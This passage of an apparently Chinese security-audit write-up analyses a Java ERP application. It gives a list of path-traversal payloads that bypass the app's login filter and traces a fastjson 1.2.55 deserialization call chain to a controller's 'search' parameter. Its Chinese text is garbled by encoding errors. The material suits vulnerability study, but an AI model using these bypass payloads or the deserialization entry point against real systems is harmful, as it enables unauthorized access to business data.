class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//å…·ä½“ï¼Œæ¯”å¦‚ï¼šå¤„ç†è‹¥ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//å¦‚æœå·²ç™»å½•ï¼Œä¸é˜»æ­¢</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//æœªç™»å½•æ—¶å…è®¸è®¿é—®çš„é¡µé¢</span><br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>                                   requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// ignoredList</span><br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// allowUrls</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//if æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œé‡å®šå‘åˆ° /login.html</span><br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤é€»è¾‘ï¼š</p><ul><li>æ”¾è¡Œï¼š<ul><li>Session ä¸­æœ‰ user</li><li>è®¿é—® <code>/doc.html</code> <code>/register.html</code> <code>/login.html</code>   </li><li>ignoredList  é™æ€èµ„æº</li><li>allowUrls     &#x2F;user&#x2F;login   &#x2F;user&#x2F;registerUser    &#x2F;v2&#x2F;api-docs</li></ul></li><li>å…¶ä»–å…¨éƒ¨é‡å®šå‘åˆ° &#x2F;login.html</li><li>ç¼ºé™·ï¼š<ul><li>è™½ç„¶æœ‰ç™½åå•ï¼Œä½†è·¯å¾„åŒ¹é…ä¸å®Œæ•´ï¼Œå¦‚æœåœ¨ url ä¸­æ„å»ºå¦‚ï¼š1.css&#x2F;..&#x2F;index.html  doc.html&#x2F;..&#x2F;index.html ç­‰ï¼Œå°±ä¼šç»•è¿‡</li></ul></li></ul><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">/doc.html/../home.html<br>/register.html/../home.html<br>/login.html/../home.html<br>/1.css/../home.html<br>/user/login/../../home.html<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png"></p><p><strong>æ³¨æ„ï¼š</strong></p><p>è¿™æŠ“åŒ…ä¸­æœ‰æ—¶ä¼šæŠ“åˆ°è¿™æ ·ä¸€è¡Œæ•°æ®ï¼š If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT  </p><p>è¿™æ˜¯æµè§ˆå™¨çš„æœ¬åœ°ç¼“å­˜ï¼Œå¦‚æœè¿™ä¸ªèµ„æºè‡ªè¿™ä¸ªæ—¶é—´ç‚¹ä¹‹åæ²¡æœ‰ä¿®æ”¹ï¼Œå°±è¿”å›304</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png"></p><p>æŠŠè¿™ä¸ªå»æ‰å°±å¯ä»¥æ­£å¸¸æ³¨å…¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png"></p><h2 id="2ã€pom-xml-Maven-ä¾èµ–"><a href="#2ã€pom-xml-Maven-ä¾èµ–" class="headerlink" title="2ã€pom.xml - Maven ä¾èµ–"></a>2ã€pom.xml - <strong>Maven ä¾èµ–</strong></h2><h3 id="2-1-fastjson-1-2-55-ååºåˆ—åŒ–æ¼æ´"><a href="#2-1-fastjson-1-2-55-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="2.1 fastjson-1.2.55-ååºåˆ—åŒ–æ¼æ´"></a>2.1 fastjson-1.2.55-ååºåˆ—åŒ–æ¼æ´</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png"></p><p>å…¥å£ç‚¹ï¼šparseObject</p><p>**å…¨å±€æœç´¢ parseObject **ï¼Œæ‰¾ä¸€ä¸ªå¸¦æœ‰å¯æ§å˜é‡çš„ç‚¹</p><p>æ‰¾åˆ° src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsh&#x2F;erp&#x2F;utils&#x2F;StringUtil.java ä¸­æœ‰åˆ©ç”¨ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png"></p><h4 id="åˆ†æé“¾ï¼š"><a href="#åˆ†æé“¾ï¼š" class="headerlink" title="åˆ†æé“¾ï¼š"></a>åˆ†æé“¾ï¼š</h4><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-comment">//è¿”å›å€¼åˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸²</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//åˆ¤æ–­ search æ˜¯å¦ä¸ºç©º</span><br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">//å°† search è§£æä¸º JSONObject</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>        <span class="hljs-comment">//ä» JSONObject å–ä¸€ä¸ª key å¹¶è½¬åŒ–ä¸º String</span><br>        value = obj.getString(key);<br>        <span class="hljs-comment">//å¦‚æœå–åˆ°ç©ºå­—ç¬¦ä¸²ï¼Œvalue = null;</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">JSONObject.parseObject</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br><span class="hljs-comment">//è°ƒç”¨äº† parse æ–¹æ³•ï¼ŒæŠŠ text è§£ææˆä¸€ä¸ª Java å¯¹è±¡</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br><span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>    <span class="hljs-keyword">return</span> (JSONObject) obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">parse(String text)</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-comment">//è°ƒç”¨äº†å¦ä¸€ä¸ª parse</span><br>    <span class="hljs-keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">parse(String text, int features)</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-comment">//å¼•å…¥äº† ParserConfig.getGlobalInstance() æ–¹æ³•</span><br>    <span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› parse(String text, ParserConfig config, int features)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-comment">//è§£æ JSON</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">DefaultJSONParser</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String input, <span class="hljs-keyword">final</span> ParserConfig config, <span class="hljs-type">int</span> features)</span>&#123;<br>    <span class="hljs-comment">//åˆ›å»º JSONScanner ï¼Œä¼ ç»™ä¸‹ä¸€ä¸ªæ ¸å¿ƒæ„é€ å™¨</span><br>    <span class="hljs-built_in">this</span>(input, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONScanner</span>(input, features), config);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object input, <span class="hljs-keyword">final</span> JSONLexer lexer, <span class="hljs-keyword">final</span> ParserConfig config)</span>&#123;<br>    <span class="hljs-comment">//lexerï¼šè¯æ³•åˆ†æå™¨ã€‚</span><br>    <span class="hljs-built_in">this</span>.lexer = lexer;<br>    <span class="hljs-comment">//ç”¨æˆ·è¾“å…¥çš„ JSON å­—ç¬¦ä¸²</span><br>    <span class="hljs-built_in">this</span>.input = input;<br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-built_in">this</span>.symbolTable = config.symbolTable;<br><br>    <span class="hljs-comment">//è·å– JSON è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç”¨äºåˆ¤æ–­ JSON çš„ç±»å‹ï¼š&#123; å¯¹è±¡ï¼›[ æ•°ç»„ï¼›å…¶ä»–ï¼ˆæ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”ç­‰ï¼‰</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> lexer.getCurrent();<br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        lexer.nextToken(); <span class="hljs-comment">// prime the pump</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong><font style="color:rgb(34, 34, 38);">lexerï¼ˆè¯æ³•åˆ†æå™¨ï¼‰ä¸ parserï¼ˆè¯­æ³•åˆ†æå™¨ï¼‰</font></strong></p><p><a href="https://blog.csdn.net/buguge/article/details/147525215"><strong>https://blog.csdn.net/buguge/article/details/147525215</strong></a></p><p><strong><font style="color:rgb(77, 77, 77);">è¯æ³•åˆ†æå™¨(Lexer)å’Œè¯­æ³•åˆ†æå™¨(Parser)</font></strong><font style="color:rgb(77, 77, 77);">æ˜¯ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶ï¼Œå®ƒä»¬ååŒå·¥ä½œå°†åŸå§‹è¾“å…¥(å¦‚JSONå­—ç¬¦ä¸²ã€ä»£ç æ–‡ä»¶)è½¬æ¢ä¸ºç»“æ„åŒ–æ•°æ®(å¦‚å¯¹è±¡ã€æŠ½è±¡è¯­æ³•æ ‘)</font></p></blockquote><p>è¿”å›ä¸€æ­¥ï¼ŒObject value &#x3D; parser.parse();   è·Ÿè¿› parse()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(Object fieldName)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.lexer;<br><span class="hljs-keyword">switch</span> (lexer.token()) &#123;<br>    ...<br>    <span class="hljs-keyword">case</span> LBRACE:<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));<br>        <span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>    ...<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› parseObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç±»ä¸­æ‰¾æˆ‘ä»¬éœ€è¦çš„å¤„ç† @type çš„éƒ¨åˆ†ï¼Œæœç´¢  checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JSON.DEFAULT_TYPE_KEY å³ @type</span><br><span class="hljs-keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> lexer.scanSymbol(symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><br>    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br></code></pre></td></tr></table></figure><p>æ¥åˆ°è¿™ä¸ªç±»ä¸­ï¼ŒæŒ‰ç…§ä¹‹å‰ç‰ˆæœ¬çš„ç»éªŒï¼Œä¸‹ä¸€æ­¥æœ‰ä¸ª <font style="color:rgb(51, 51, 51);">TypeUtils.loadClass ï¼Œç»§ç»­æœç´¢</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (autoTypeSupport || expectClassFlag) &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> h3;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>        hash ^= className.charAt(i);<br>        hash *= PRIME;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› TypeUtils.loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) &#123;<br>    <span class="hljs-keyword">if</span>(className == <span class="hljs-literal">null</span> || className.length() == <span class="hljs-number">0</span> || className.length() &gt; <span class="hljs-number">128</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥æ‰§è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><span class="hljs-keyword">if</span>(deserializer != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(object);<br>    <span class="hljs-keyword">return</span> (T) JSON.parseObject(json, clazz);<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">åœ¨æ‰§è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨å®ä¾‹åŒ–çš„ç±»ï¼Œæ‰§è¡Œåç»­å‘½ä»¤</font></p><p><font style="color:rgb(51, 51, 51);"></font></p><p>æ¥ä¸‹æ¥åº”è¯¥æ‰¾<strong>è°ƒç”¨ StringUtil#getInfo æ–¹æ³•</strong>çš„åœ°æ–¹</p><p>çœ‹äº†å‚è€ƒæ–‡ç« æ‰¾åˆ° <font style="color:rgb(51, 51, 51);">UserComponent</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//æ¥æ”¶åˆ°å‰ç«¯ä¼ çš„ Map&lt;String,String&gt;ï¼ŒåŒ…å« search </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> QueryUtils.filter(map);<br>    <span class="hljs-keyword">return</span> userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰¾ getUserList çš„è°ƒç”¨åœ°æ–¹ï¼Œè¿™æ—¶åº”è¯¥æ‰¾çš„æ˜¯æ§åˆ¶å™¨é‡Œçš„æ–¹æ³•äº†</p><blockquote><p>å‡ ä¸ªè¸©å‘çš„åœ°æ–¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png"></p><p>æˆ‘ä»¬è¦æ³¨æ„ï¼ŒçœŸæ­£åº”è¯¥è°ƒç”¨çš„æ˜¯ <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map)ï¼Œè€Œä¸Šé¢çš„éƒ½ä¸æ˜¯æ­£ç¡®è°ƒç”¨</font></p></blockquote><p>æ‰¾åˆ°çœŸæ­£è°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map) çš„åœ°æ–¹</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·¯å¾„å˜é‡ &#123;apiName&#125; </span><br><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      //search 